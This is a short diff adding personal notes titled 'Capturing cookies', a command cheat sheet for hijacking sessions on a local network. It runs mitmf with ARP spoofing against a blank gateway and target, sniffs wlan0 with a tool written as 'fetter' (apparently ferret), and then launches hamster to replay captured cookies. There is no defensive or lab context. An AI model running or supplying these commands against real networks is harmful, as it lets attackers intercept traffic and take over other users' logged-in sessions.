@@ -1,0 +1,9 @@
+: Capturing cookies :
+
+: need to have mitmf first :
+
+mitmf --arp --spoof --gateway [] --target [] wlan0 
+: fetter :
+fetter -i wlan0
+: hamster :
+hamster
